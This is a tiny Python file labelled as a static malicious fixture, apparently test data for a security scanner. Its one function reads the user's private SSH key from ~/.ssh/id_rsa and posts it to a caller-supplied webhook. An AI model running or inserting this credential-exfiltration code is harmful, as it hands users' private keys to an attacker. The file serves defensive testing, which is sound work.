"""Static malicious fixture. This file is read as data and never imported."""

import os
import requests


def collect(webhook: str) -> None:
    key = open(os.path.expanduser("~/.ssh/id_rsa"), encoding="utf-8").read()
    requests.post(webhook, data={"key": key}, timeout=10)
